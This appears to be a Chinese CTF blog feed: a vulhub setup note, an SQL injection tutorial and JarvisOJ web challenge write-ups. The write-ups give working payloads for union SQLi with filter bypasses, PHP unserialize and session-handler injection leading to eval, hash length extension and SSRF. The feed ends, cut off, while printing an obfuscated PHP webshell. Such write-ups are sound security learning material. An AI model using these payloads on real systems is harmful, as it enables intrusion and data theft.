vulhub-master.zip</code></pre><p>解压时候可能会报错</p><pre><code>unzip:  cannot find zipfile directory in one of vulhub-master.zip orvulhub-master.zip.zip, and cannot find vulhub-master.zip.ZIP, period.</code></pre><p>我们换个压缩方式就成</p><pre><code>sudo apt-get install fastjarjar xvf vulhub-master.zip</code></pre><p>然后</p><pre><code>cd vulhub-master# Enter the directory of vulnerability/environmentcd flask/ssti# Compile environmentdocker-compose build# Run environmentdocker-compose up -d</code></pre><p>愉快的学习吧！</p><h2 id="复现ctf环境"><a href="#复现ctf环境" class="headerlink" title="复现ctf环境"></a>复现ctf环境</h2><h3 id="dockerfile"><a href="#dockerfile" class="headerlink" title="dockerfile"></a>dockerfile</h3><p>先进入dockerfile目录，建立一个images</p><pre><code>docker build -t name . docker run -i -d -p 20000:80 name</code></pre><h3 id="docker-compose-yml"><a href="#docker-compose-yml" class="headerlink" title="docker-compose.yml"></a>docker-compose.yml</h3><pre><code>docker-compose builddocker-compose up -d</code></pre><h2 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h2><blockquote><p><a href="https://github.com/vulhub/vulhub">https://github.com/vulhub/vulhub</a><br><a href="https://www.runoob.com/docker/docker-container-connection.html" target="_blank" rel="noopener">https://www.runoob.com/docker/docker-container-connection.html</a><br><a href="https://askubuntu.com/questions/54904/unzip-error-end-of-central-directory-signature-not-found" target="_blank" rel="noopener">https://askubuntu.com/questions/54904/unzip-error-end-of-central-directory-signature-not-found</a><br><a href="https://blog.csdn.net/qq_35451572/article/details/79516563" target="_blank" rel="noopener">https://blog.csdn.net/qq_35451572/article/details/79516563</a></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> docker </category>
          
      </categories>
      
      
        <tags>
            
            <tag> docker </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SQL入门</title>
      <link href="/2019/08/02/SQL%E5%85%A5%E9%97%A8/"/>
      <url>/2019/08/02/SQL%E5%85%A5%E9%97%A8/</url>
      
        <content type="html"><![CDATA[<p>Sql注入真的超神奇的，我怎么都学不会呢！<br>😀</p><a id="more"></a><h1 id="开始之前"><a href="#开始之前" class="headerlink" title="开始之前"></a>开始之前</h1><h2 id="常用函数"><a href="#常用函数" class="headerlink" title="常用函数"></a>常用函数</h2><h3 id="系统函数"><a href="#系统函数" class="headerlink" title="系统函数"></a>系统函数</h3><ul><li>version() mysql版本</li><li>user() 数据库用户名</li><li>database() 数据库名</li><li>@@datadir 数据库路径</li><li>@@version_compile_os 操作系统版本</li></ul><h3 id="字符串连接函数"><a href="#字符串连接函数" class="headerlink" title="字符串连接函数"></a>字符串连接函数</h3><ul><li>concat(str1,str2, …) 没有分隔符的连接字符串</li><li>concat_ws(separator,str1,str2,…) 有分隔符的连接字符串</li><li>group_concat(str1,str2,…) 连接一个组的所有字符串，并以逗号分隔每一条数据</li></ul><h3 id="常用尝试语句"><a href="#常用尝试语句" class="headerlink" title="常用尝试语句"></a>常用尝试语句</h3><ul><li>or 1=1 –+(注释符)</li><li>‘ or 1=1 –+</li><li>“ or 1=1 –+</li><li>) or 1=1 –+</li><li>‘) or 1=1 –+</li><li>“) or 1=1 –+</li><li>“)) or 1=1 –+</li><li>–+可以用#替换</li></ul><p>查询语句一般为</p><pre><code>$sql=&quot;SELECT * from users where id = &apos;$id&apos; limit 0,1&quot;</code></pre><p>从上面的尝试语句我们可以看出来语句的作用有两个，一个是人为闭合 <code>$id</code> 后面的半个单引号，一个是注释整个语句后的引号。</p><h3 id="union-操作符"><a href="#union-操作符" class="headerlink" title="union 操作符"></a>union 操作符</h3><p>union操作符用来合并两个或多个SELECT语句的结果集。使用union时的select语句必须拥有相同数量的列，同时列也必须有相似的数据类型，且每条select语句中列的顺序必须相同。</p><p>例如这两有三个数据表</p><pre><code>+-----------------+| Tables_in_test1 |+-----------------+| emails          || user            || users           |+-----------------+select * from emails;+--------+-------------+| number | addr        |+--------+-------------+|  1     | 123@126.com |+--------+-------------+1 row in set (0.00 sec)+----+--------------------------------+----------+| id | username                       | password |+----+--------------------------------+----------+|  1 | admin                          | 1234567  ||  2 | 012345678901234567890123456789 | 1234567  |</code></pre><p>两个表的列数量不同则我们就无法使用UNION</p><pre><code>mysql&gt; select * from emails UNION select * from user;ERROR 1222 (21000): The used SELECT statements have a different number of columns</code></pre><p>默认的，UNION操作符选取不同的值，如果允许重复的话请使用UNION ALL。另外，UNION结果集中的列名总是等于UNION中第一个SELECT结果的列名。</p><h3 id="逻辑运算"><a href="#逻辑运算" class="headerlink" title="逻辑运算"></a>逻辑运算</h3><p>为什么我们称 <code>&#39; or 1=1#</code> 为万能密码？</p><p>查询语句是<code>select * from admin where username = &#39;admin&#39; and passwd = &#39;&#39; or 1=1#&#39;</code> 时我们可以不输入密码进行登陆账户，原因在于where 后面的三个条件语句<code>username = &#39;admin&#39;</code>  <code>and passwd=&#39;&#39;</code>  <code>or 1=1</code>。三个子句用 and 、 or 连接，在sql语句中 and 运算符的优先级高于 or 运算符。在计算时第一个子句为真，第二个为假，二者and以后为假，这个假的结果再与第三个or ，结果为真，所以这整句的结果就恒真了。</p><h2 id="UNION-联合查询注入"><a href="#UNION-联合查询注入" class="headerlink" title="UNION 联合查询注入"></a>UNION 联合查询注入</h2><p>关于UNION 的用法请参考第一节。</p><p>使用联合查询注入利用的前提是页面有回显位。</p><p>所谓回显位是指在一个网站的正常页面，服务端执行SQL语句查询数据库中的数据，客户端将数据展现在页面中，这个展示数据的位置就叫回显位。</p><p>联合查询的基本步骤</p><ol><li>找到注入点判断闭合方式</li><li>判断数据库类型</li><li>判断查询列数</li><li>判断回显位</li><li>获取数据库名</li><li>获取表名</li><li>获取字段名</li><li>获取字段中的数据</li></ol><p>ORDER BY子句是基于一个或多个字段按照升序或降序对其中的数据进行排序。一些数据库默认的对查询结果进行升序排序，例如mysql。</p><p>我们可以指定字段名进行排序。这里我们有一张表</p><pre><code>+----+----------+-----+-----------+----------+| ID | NAME     | AGE | ADDRESS   | SALARY   |+----+----------+-----+-----------+----------+|  1 | Ramesh   |  32 | Ahmedabad |  2000.00 ||  2 | Khilan   |  25 | Delhi     |  1500.00 ||  3 | kaushik  |  23 | Kota      |  2000.00 ||  4 | Chaitali |  25 | Mumbai    |  6500.00 ||  5 | Hardik   |  27 | Bhopal    |  8500.00 ||  6 | Komal    |  22 | MP        |  4500.00 ||  7 | Muffy    |  24 | Indore    | 10000.00 |+----+----------+-----+-----------+----------+</code></pre><p>查询语句例如 </p><pre><code>SELECT * FROM CUSTOMERS   ORDER BY NAME, SALARY;</code></pre><p>查询结果如下</p><pre><code>+----+----------+-----+-----------+----------+| ID | NAME     | AGE | ADDRESS   | SALARY   |+----+----------+-----+-----------+----------+|  4 | Chaitali |  25 | Mumbai    |  6500.00 ||  5 | Hardik   |  27 | Bhopal    |  8500.00 ||  3 | kaushik  |  23 | Kota      |  2000.00 ||  2 | Khilan   |  25 | Delhi     |  1500.00 ||  6 | Komal    |  22 | MP        |  4500.00 ||  7 | Muffy    |  24 | Indore    | 10000.00 ||  1 | Ramesh   |  32 | Ahmedabad |  2000.00 |+----+----------+-----+-----------+----------+</code></pre><p>同时，我们也可以指定字段的栏位进行排序，第一个字段为1，第二个为2，以此类推。</p><p>这里我们有一张表</p><pre><code>+----+----------+------------+| id | username | password   |+----+----------+------------+|  1 | Dumb     | Dumb        ||  2 | Angelina | I-kill-you ||  3 | Dummy    | p@ssword   ||  4 | secure   | crappy      ||  5 | stupid   | stupidity  ||  6 | superman | genious     ||  7 | batman   | mob!le      ||  8 | admin    | admin       ||  9 | admin1   | admin1      || 10 | admin2   | admin2      || 11 | admin3   | admin3      || 12 | dhakkan  | dumbo       || 14 | admin4   | admin4      || 15 | admin#   | 789          |+----+----------+------------+</code></pre><p>我们使用栏位进行查询</p><pre><code>select * from users order by 3;</code></pre><p>查询结果按照第三栏进行排序</p><pre><code>+----+----------+------------+| id | username | password   |+----+----------+------------+| 15 | admin#   | 789         ||  8 | admin    | admin       ||  9 | admin1   | admin1      || 10 | admin2   | admin2      || 11 | admin3   | admin3      || 14 | admin4   | admin4      ||  4 | secure   | crappy      ||  1 | Dumb     | Dumb        || 12 | dhakkan  | dumbo       ||  6 | superman | genious     ||  2 | Angelina | I-kill-you ||  7 | batman   | mob!le      ||  3 | Dummy    | p@ssword   ||  5 | stupid   | stupidity  |+----+----------+------------+</code></pre><p>如果我们查询一个不存在的栏位呢？</p><pre><code>select * from users order by 4;</code></pre><p>数据库将会报错</p><pre><code>ERROR 1054 (42S22): Unknown column &apos;4&apos; in &apos;order clause&apos;</code></pre><p>基于此，我们可以利用二分法来对列数进行猜解。</p><p>我们使用UNION来判断回显位，UNION的作用是将两个select查询结果合并</p><pre><code>select id,username from users where id=4 union select 1,2;</code></pre><p>查询结果如下</p><pre><code>+----+----------+| id | username |+----+----------+|  4 | secure   ||  1 | 2          |+----+----------+</code></pre><p>在展示数据的时候通常指取结果集的第一行数据，如果我们想取出后半部分的结果，就要使原来的查询查不出结果</p><pre><code>select id,username from users where id=-4 union select 1,2;</code></pre><p>通过查询负数，这样就可以得到我们先要的数据了</p><pre><code>+----+----------+| id | username |+----+----------+|  1 | 2        |+----+----------+</code></pre><p>得到回显位之后，获取数据库名就在回显位使用database()函数</p><pre><code>select id,username from users where id=-4 union select 1,database();</code></pre><p>接下来查询库中所有表名，仍然是在回显位进行查询</p><pre><code>select id,username from users where id=-4 union select 1,group_concat(table_name) from information_schema.tables where table_schema=database();</code></pre><p>然后是表中的列名</p><pre><code>select id,username from users where id=-4 union select 1,group_concat(column_name) from information_schema.columns where table_name=&apos;users&apos;;</code></pre><p>最后是数据</p><pre><code>select id,username from users where id=-4 union select 1,username from users;</code></pre>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JarvisOJ WP</title>
      <link href="/2019/08/01/JarvisOJ/"/>
      <url>/2019/08/01/JarvisOJ/</url>
      
        <content type="html"><![CDATA[<p>真是被自己菜哭了，暑假第一个月一定要把WEB刷完写完WP！</p><a id="more"></a><h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><p>有时间也做做别的</p><h3 id="PORT51"><a href="#PORT51" class="headerlink" title="PORT51"></a>PORT51</h3><p>题目链接：<a href="http://web.jarvisoj.com:32770/" title="题目链接" target="_blank" rel="noopener">http://web.jarvisoj.com:32770/</a></p><p>要用本地51端口去访问</p><pre><code>curl --local-port 51 http://web.jarvisoj.com:32770/</code></pre><p>但是应该是题目问题，没显示出来flag。</p><h3 id="Localhost"><a href="#Localhost" class="headerlink" title="Localhost"></a>Localhost</h3><p>题目链接 <a href="http://web.jarvisoj.com:32774/" target="_blank" rel="noopener">http://web.jarvisoj.com:32774/</a></p><p>题目要求localhost only,我们可以通过伪造X-FORWARDED-FOR来达到目的</p><pre><code>import requestsurl=&apos;http://web.jarvisoj.com:32774/&apos;s=requests.session()data={&apos;X-FORWARDED-FOR&apos;:&apos;127.0.0.1&apos;}r=s.get(url,headers=data)print(r.text)</code></pre><p>返回信息包含flag</p><h4 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h4><p>这里再稍稍补充一下HTTP协议请求头的知识</p><ol><li>每个HTTP请求的第一行都由3个以空格间隔的项目组成</li><li>一个说明HTTP方法的动词，主要作用是从Web服务器获取一个资源，GET请求并没有消息主题，因此消息头后的空白行中没有其他数据。</li><li>第二个是请求的URL，通常由一个所请求的资源名称以及客户端向该资源提交的参数的可选查询字符串组成</li><li>第三个是使用的HTTP版本，常用HTTP版本为1.1和1.0，我们遇到的唯一差异可能就是1.1版本必须使用Host请求</li><li>Referer消息头表示用于发出请求的原始URL</li><li>User-Agent消息头提供与浏览器或其他生成请求的客户端软件有关的信息</li><li>Host消息头用于指定出现在被访问的完整URL中的主机名称，如果几个WEB站点以相同的一台服务器为主机就需要指定HOST，因为第一行中的URL通常不包含主机名称。服务器可以通过该字段进行IP过滤操作。</li><li>X-FORWARDED-FOR当你使用了代理时web服务器就不知道你的真实IP了，为了避免这种情况代理服务器会增加一个该字段信息，把链接他的客户端IP加到这个消息头里，保证服务器能获取到真实IP。这是一个扩展头。</li><li>cookie为服务器端生成的存于客户端的身份标识</li></ol><h3 id="Login"><a href="#Login" class="headerlink" title="Login"></a>Login</h3><p>题目链接：<a href="http://web.jarvisoj.com:32772/" target="_blank" rel="noopener">http://web.jarvisoj.com:32772/</a></p><p>打开题目是一个密码的提交框，随便测一下没什么收获，查看请求信息发现HINT在响应头里</p><pre><code>&quot;select * from `admin` where password=&apos;&quot;.md5($pass,true).&quot;&apos;&quot;</code></pre><p>这里将md5后的密码提交查询，注意到md5的第二个参数为true</p><pre><code>string md5( string $str[, bool $raw_output = false] )</code></pre><p><strong>raw_output<br>如果可选的 raw_output 被设置为 TRUE，那么 MD5 报文摘要将以16字节长度的原始二进制格式返回。</strong></p><p>我们需要寻找一个字符串在md5之后含有 <code>&#39; or &#39;</code> 之类的可以产生闭合的。</p><p>国外的大佬在2010年跑出来了几个符合条件的<a href="http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes" title="这是那篇博客" target="_blank" rel="noopener">http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes</a></p><p>我们可以用两个 </p><pre><code>129581926211651571912466741651878684928ffifdyop</code></pre><h3 id="神盾局的秘密"><a href="#神盾局的秘密" class="headerlink" title="神盾局的秘密"></a>神盾局的秘密</h3><p>题目链接：<a href="http://web.jarvisoj.com:32768/" target="_blank" rel="noopener">http://web.jarvisoj.com:32768/</a></p><p>进入题目后查看源码发现ba64加密的字符串，</p><p><code>http://web.jarvisoj.com:32768/showimg.php?img=c2hpZWxkLmpwZw==</code></p><p>尝试编码index.php读源码</p><pre><code>&lt;?php     require_once(&apos;shield.php&apos;);    $x = new Shield();    isset($_GET[&apos;class&apos;]) &amp;&amp; $g = $_GET[&apos;class&apos;];    if (!empty($g)) {        $x = unserialize($g);    }    echo $x-&gt;readfile();?&gt;</code></pre><p>可以看到包含了shield.php，再读shield.php</p><pre><code>&lt;?php    //flag is in pctf.php    class Shield {        public $file;        function __construct($filename = &apos;&apos;) {            $this -&gt; file = $filename;        }        function readfile() {            if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE              &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {                return @file_get_contents($this-&gt;file);            }        }    }?&gt;</code></pre><p>简单的序列化，控制file变量</p><pre><code>&lt;?php    //flag is in pctf.phpclass Shield {    public $file;    function __construct($filename = &apos;&apos;) {        $this -&gt; file = $filename;    }    function readfile() {        if (!empty($this-&gt;file) &amp;&amp; stripos($this-&gt;file,&apos;..&apos;)===FALSE          &amp;&amp; stripos($this-&gt;file,&apos;/&apos;)===FALSE &amp;&amp; stripos($this-&gt;file,&apos;\\&apos;)==FALSE) {            return @file_get_contents($this-&gt;file);        }    }}$example = new Shield();$example-&gt;file = &quot;pctf.php&quot;;echo serialize($example);?&gt;</code></pre><h3 id="IN-A-Mess"><a href="#IN-A-Mess" class="headerlink" title="IN A Mess"></a>IN A Mess</h3><p>题目链接：<a href="http://web.jarvisoj.com:32780/" target="_blank" rel="noopener">http://web.jarvisoj.com:32780/</a></p><p>查看源码发现hint，进而读取源码</p><pre><code>&lt;?phperror_reporting(0);echo &quot;&lt;!--index.phps--&gt;&quot;;if(!$_GET[&apos;id&apos;]){    header(&apos;Location: index.php?id=1&apos;);    exit();}$id=$_GET[&apos;id&apos;];$a=$_GET[&apos;a&apos;];$b=$_GET[&apos;b&apos;];if(stripos($a,&apos;.&apos;)){    echo &apos;Hahahahahaha&apos;;    return ;}$data = @file_get_contents($a,&apos;r&apos;);if($data==&quot;1112 is a nice lab!&quot; and $id==0 and strlen($b)&gt;5 and eregi(&quot;111&quot;.substr($b,0,1),&quot;1114&quot;) and substr($b,0,1)!=4){    require(&quot;flag.txt&quot;);}else{    print &quot;work harder!harder!harder!&quot;;}?&gt;</code></pre><p>简单分析之后我们需要注意几个点</p><ol><li>stripos()字符串截取函数，与strpos不同前者不区分大小写。</li><li>php中 <code>0admin == 0</code> ,在比较时会将字符串转换成整型再比较。</li><li>file_get_contents() 函数是用来将文件的内容读入到一个字符串中的首选方法，Note: 如果要打开有特殊字符的 URL （比如说有空格），就需要使用 urlencode() 进行 URL 编码。也就是说我们可以在服务器上放一个文件然后传ip地址，如果这样做的话我们还要避免 <code>.</code>,我们可以通过将点分十进制转换为十进制。转换器：<a href="https://www.whois365.com/cn/tools/decimal-ip?w365id=428a6eb1dd9e0f29145ac2de574e31ef" title="地址转换" target="_blank" rel="noopener">https://www.whois365.com/cn/tools/decimal-ip?w365id=428a6eb1dd9e0f29145ac2de574e31ef</a>。同时我们也可以使用伪协议：<code>php://input</code> 来Post一个字符串。</li><li>eregi()不区分大小写的正则表达式匹配.这里我们通过%00截断来绕过eregi的检测。</li><li>%00在strlen的判断中仍占3个字符。</li></ol><p>我们进行构造</p><pre><code>http://web.jarvisoj.com:32780/index.php?id=0admin&amp;a=php://input&amp;b=%00admin</code></pre><p>得到</p><p>﻿<code>Come ON!!! {/^HT2mCpcvOLf}</code></p><p>进行访问得到</p><pre><code>http://web.jarvisoj.com:32780/^HT2mCpcvOLf/index.php?id=1</code></pre><p>现在开始这是一道注入题了</p><p>测试id=2,返回</p><pre><code>SELECT * FROM content WHERE id=2</code></pre><p>id=1’</p><pre><code>SELECT * FROM content WHERE id=1&apos;</code></pre><p>id=1 and 1=1 #</p><pre><code>you bad boy/girl!</code></pre><p>测试发现我们不需要闭合单引号与注释，同时过滤了空格。对于空格首先尝试/**/，发现不行，那么/*a*/呢？</p><pre><code>?id=1/*a*/and/*a*/1=1 hi666</code></pre><p>这样可以。然后猜测字段个数</p><pre><code>?id=1/*a*/order/*a*/by/*a*/3</code></pre><p>看回显位，这里union,select 都被过滤，双写绕过</p><pre><code>?id=-1/*a*/ununionion/*a*/selselectect/*a*/1,2,3</code></pre><p>看数据库</p><pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),database()</code></pre><p>看表，这里from同样双写</p><pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),group_concat(table_name)/*a*/frfromom/*a*/information_schema.tables/*a*/where/*a*/table_schema=database()</code></pre><p>看字段，不能直接传表名，需要16进制编码一下</p><pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),group_concat(column_name)/*a*/frfromom/*a*/information_schema.columns/*a*/where/*a*/table_name=0x636f6e74656e74</code></pre><p>看信息得到flag</p><pre><code>?id=-1/*a*/ununionion/*a*/seselectlect/*a*/database(),version(),context/*a*/frofromm/*a*/content    </code></pre><h3 id="flag在管理员手里"><a href="#flag在管理员手里" class="headerlink" title="flag在管理员手里"></a>flag在管理员手里</h3><p>题目链接：<a href="http://web.jarvisoj.com:32778/" target="_blank" rel="noopener">http://web.jarvisoj.com:32778/</a></p><p>拿到题目看到 <strong>Only Admin can see the flag!!</strong></p><p>先看看响应头信息，尝试改一下cookie为admin，果然没这么简单。</p><p>拿扫描器扫一下扫到了<code>index.php~</code>,看一下16进制数据发现是vim产生的文件，先改一下后缀为<code>index.php.swp</code>用<code>vim -r index.php</code> 恢复一下得到源码.</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Web 350&lt;/title&gt;&lt;style type=&quot;text/css&quot;&gt;    body {        background:gray;        text-align:center;    }&lt;/style&gt;&lt;/head&gt;&lt;body&gt;    &lt;?php         $auth = false;        $role = &quot;guest&quot;;        $salt =         if (isset($_COOKIE[&quot;role&quot;])) {            $role = unserialize($_COOKIE[&quot;role&quot;]);            $hsh = $_COOKIE[&quot;hsh&quot;];            if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;]))) {                $auth = true;            } else {                $auth = false;            }        } else {            $s = serialize($role);            setcookie(&apos;role&apos;,$s);            $hsh = md5($salt.strrev($s));            setcookie(&apos;hsh&apos;,$hsh);        }        if ($auth) {            echo &quot;&lt;h3&gt;Welcome Admin. Your flag is &quot;        } else {            echo &quot;&lt;h3&gt;Only Admin can see the flag!!&lt;/h3&gt;&quot;;        }    ?&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>重点是 <code>if ($role===&quot;admin&quot; &amp;&amp; $hsh === md5($salt.strrev($_COOKIE[&quot;role&quot;])))</code></p><p>HASH长度扩展攻击没错了。</p><h4 id="Hash-Length-Extension-Attacks"><a href="#Hash-Length-Extension-Attacks" class="headerlink" title="Hash Length Extension Attacks"></a>Hash Length Extension Attacks</h4><p><strong>原理</strong></p><blockquote><p>服务器将sercet 和 message 连接在一起，然后用摘要算法取摘要，研究发现MD4、MD5、RIPEMD-160、SHA-0、SHA-1、SHA-256、SHA-512、WHIRLPOOL等摘要算法受此攻击，但MD2、SHA-224和SHA-384不受此攻击。</p><p>哈希摘要算法，如MD5、SHA1、SHA2等，都是基于Merkle–Damgård结构。这类算法有一个很有意思的问题：当知道hash(secret + message)的值及secret长度的情况下，可以轻松推算出hash(secret + message||padding||m’)。在这里m’是任意数据，||是连接符，可以为空,padding是secret后的填充字节。hash的padding字节包含整个消息的长度，因此，为了能准确计算出padding的值，secret的长度我们也是需要知道的。</p><p>当我们填充后，服务器算出的原始hash值，正好与我们添加扩展字符串并覆盖初始链变量所计算出来的一样。这是因为攻击者的哈希计算过程，相当于从服务器计算过程的一半紧接着进行下去。提交此hash值便能通过验证了，这就是所谓的哈希长度拓展攻击(Hash Length Extension Attacks)。</p></blockquote><p>MD5会对消息进行分组，每组64Byte,也就是512bit,不足512bit的会补位，使长度补充到56Byte,补位的二进制表示是在消息后面加一个1，后面都是0，也就是说在16进制下我们需要在后面补80，其他都是0，直到补到56Byte。</p><p>剩下的8Byte表示补位前消息长度，该长度是小端存储，高字节放在高地址中。计算开始前有一组初始向量负责第一轮的加密，此后每一次加密的结果作为下一次加密的初始向量。</p><p>MD5的初始向量是</p><pre><code>A=0x67452301B=0xefcdab89C=0x98badcfeD=0x10325476</code></pre><p>我们举个例子来说明一下补位</p><p><img src="http://wx3.sinaimg.cn/mw690/006boCb9ly1g5iufmppywj30kv03igm3.jpg" alt></p><p>再来看这道题</p><p>我们不知道salt的长度，而算法的核心就是要知道其长度，不过我们可以爆破猜出来。同时这里对role反序了。</p><p>我们利用hashpump跑一下</p><pre><code>hashpumpInput Signature: 3a4727d57463f122833d9e732f94e4e0 //上一轮的结果，我们已经抓包得到了 Input Data: ;&quot;tseug&quot;:5:s  //原来的数据Input Key Length: 12      //长度是试出来的Input Data to Add: ;&quot;nimda&quot;:5:s //我们要添加的数据fcdc3840332555511c4e4323f6decb07;&quot;tseug&quot;:5:s\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xc0\x00\x00\x00\x00\x00\x00\x00;&quot;nimda&quot;:5:s  //记得逆序一下，然后URL编码</code></pre><p>得到</p><pre><code>role: s%3A5%3A%22admin%22%3B%00%00%00%00%00%00%00%C0%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%80s%3A5%3A%22guest%22%3Bhsh: fcdc3840332555511c4e4323f6decb07</code></pre><p>放在cookie里就可以了。</p><p>放一个其他人写的脚本</p><pre><code># -*- coding: utf-8 -*-import requests,hashpumpy,urllibdef webre(): #py2url = &apos;http://web.jarvisoj.com:32778/&apos;sha = &apos;3a4727d57463f122833d9e732f94e4e0&apos;string0 = &apos;;&quot;tseug&quot;:5:s&apos;string1 = &apos;;&quot;nimda&quot;:5:s&apos;for i in range(15):    digest, message = hashpumpy.hashpump(sha,string0,string1,i)    payload ={&apos;role&apos;:urllib.quote(message[::-1]), &apos;hsh&apos;:digest}    #payload ={&apos;role&apos;:(message[::-1]), &apos;hsh&apos;:digest}    print i,payload    html = requests.get(url,cookies=payload).text#提交答案    if &apos;Welcome&apos; in html:        print htmlwebre()</code></pre><h3 id="phpinfo"><a href="#phpinfo" class="headerlink" title="phpinfo"></a>phpinfo</h3><p>题目链接：<a href="http://web.jarvisoj.com:32784/" target="_blank" rel="noopener">http://web.jarvisoj.com:32784/</a></p><pre><code>&lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php&apos;);session_start();class OowoO{    public $mdzz;    function __construct()    {        $this-&gt;mdzz = &apos;phpinfo();&apos;;    }    function __destruct()    {        eval($this-&gt;mdzz);    }}if(isset($_GET[&apos;phpinfo&apos;])){    $m = new OowoO();}else{    highlight_string(file_get_contents(&apos;index.php&apos;));}?&gt;</code></pre><p>观察到题目phpinfo中的配置</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7ltycs7j30we056t8z.jpg" alt></p><p>构造一个POST页面</p><pre><code>&lt;form action=&quot;http://web.jarvisoj.com:32784/index.php&quot; method=&quot;POST&quot; enctype=&quot;multipart/form-data&quot;&gt;&lt;input type=&quot;hidden&quot; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot; value=&quot;123&quot; /&gt;&lt;input type=&quot;file&quot; name=&quot;file&quot; /&gt;&lt;input type=&quot;submit&quot; /&gt;&lt;/form&gt;</code></pre><p>由题目的<code>phpinfo</code>可知，全局session序列化器设置为了<code>php_serialize</code>，因此<code>upload_progress</code>会用<code>php_serialize</code>的方式创建<code>session</code>文件.在执行<code>index.php</code>时，该代码将处理器设置为了php,然后<code>session_start()</code>来读取session文件。由上文的php序列化器处理方式可知我们在session中构造<code>|序列化字符串</code>就可以。同时该题目的<code>cleanup</code>也设置为了<code>off</code></p><p>然后进行序列化。将处理器设置为<code>php_serialize</code></p><pre><code>&lt;?php//A webshell is wait for youini_set(&apos;session.serialize_handler&apos;, &apos;php_serialize&apos;);session_start();class OowoO{public $mdzz;}$a = new OowoO();$a-&gt;mdzz = &apos;print_r(scandir(dirname(__FILE__)));&apos;;echo serialize($a);?&gt;</code></pre><p>得到</p><pre><code>O:5:&quot;OowoO&quot;:1:{s:4:&quot;mdzz&quot;;s:36:&quot;print_r(scandir(dirname(__FILE__)));&quot;;}</code></pre><p>先在本地打开POST页面，随便提交一个东西然后抓包将<code>filename</code>改为序列化字符串。同时为了达到使用php解释后得到我们想要的结果，要在最前面加上<code>|</code>，同时为了防止转义，在引号前面加上<code>\</code>.</p><p>读到如下信息</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g5k7lqvj32j30r807jgmn.jpg" alt></p><p>由<code>phpinfo</code>中<code>Apache Environment</code>可知题目路径为<code>/opt/lampp/htdocs/index.php</code></p><p>于是我们修改mdzz的值为</p><pre><code>print_r(file_get_contents(&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php&quot;));</code></pre><p>得到</p><pre><code>O:5:\&quot;OowoO\&quot;:1:{s:4:\&quot;mdzz\&quot;;s:88:\&quot;print_r(file_get_contents(\&quot;/opt/lampp/htdocs/Here_1s_7he_fl4g_buT_You_Cannot_see.php\&quot;));\&quot;;}</code></pre><p>提交得到flag</p><pre><code>$flag=&quot;CTF{4d96e37f4be998c50aa586de4ada354a}&quot;</code></pre><h3 id="api"><a href="#api" class="headerlink" title="api"></a>api</h3><p>题目链接：<a href="http://web.jarvisoj.com:9882/" target="_blank" rel="noopener">http://web.jarvisoj.com:9882/</a></p><p>考察XXE，拿到题目先看一下源码发现处理xml的代码，于是抓包改content-type测试xml代码</p><p><img src="http://wx1.sinaimg.cn/mw690/006boCb9ly1g69zc4iiq8j30ne0cpdh5.jpg" alt="测试xml是否可以执行"></p><p>拿到flag</p><p><img src="http://wx2.sinaimg.cn/mw690/006boCb9ly1g69zc6zc3cj30nr0aejsl.jpg" alt="读文件"></p><h3 id="chopper"><a href="#chopper" class="headerlink" title="chopper"></a>chopper</h3><p>刚开始的网站点击管理员登陆提示<code>you are not admin</code>没有权限访问/admin这个路径，查看源码发现提示admin的IP<code>&lt;!--&lt;script&gt;alert(&#39;admin ip is 202.5.19.128&#39;)&lt;/script&gt;--&gt;</code>；回到最开始的菜刀页面查看源码发现图片的链接很奇怪</p><pre><code>http://web.jarvisoj.com:32782/proxy.php?url=http://dn.jarvisoj.com/static/images/proxy.jpg</code></pre><p>它是通过前面一个链接的<code>proxy.php</code>引入的，联想到通过构造URL的方式利用代理访问我们没有权限的路径，于是我们构造</p><pre><code>http://web.jarvisoj.com:32782/proxy.php?url=http://202.5.19.128/proxy.php?url=http://web.jarvisoj.com:32782/admin/</code></pre><p>然后我们扫到这个路径下有<code>robots.txt</code></p><pre><code>User-agent: *Disallow:trojan.phpDisallow:trojan.php.txt</code></pre><p>访问txt发现一段代码</p><pre><code>&lt;?php ${(&quot;#&quot;^&quot;|&quot;).(&quot;#&quot;^&quot;|&quot;)}=(&quot;!&quot;^&quot;`&quot;).(&quot;( &quot;^&quot;{&quot;).(&quot;(&quot;^&quot;[&quot;).(&quot;~&quot;^&quot;;&quot;).(&quot;|&quot;^&quot;.&quot;).(&quot;*&quot;^&quot;~&quot;);${(&quot;#&quot;^&quot;|&quot;).(&quot;#&quot;^&quot;|&quot;)}((&quot;-&quot;^&quot;H&quot;). (&quot;]&quot;^&quot;+&quot;). (&quot;[&quot;^&quot;:&quot;). (&quot;,&quot;^&quot;@&quot;). (&quot;}&quot;^&quot;U&quot;). (&quot;e&quot;^&quot;A&quot;). 